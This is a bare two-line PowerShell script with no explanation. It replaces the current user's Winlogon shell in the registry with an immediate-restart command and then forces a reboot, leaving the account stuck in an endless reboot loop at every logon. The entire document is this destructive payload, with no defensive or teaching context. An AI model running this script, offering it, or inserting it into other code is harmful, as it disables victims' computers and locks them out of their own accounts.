Set-ItemProperty "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name Shell -Value "powershell -Command shutdown /r /t 0"
shutdown /r /t 0
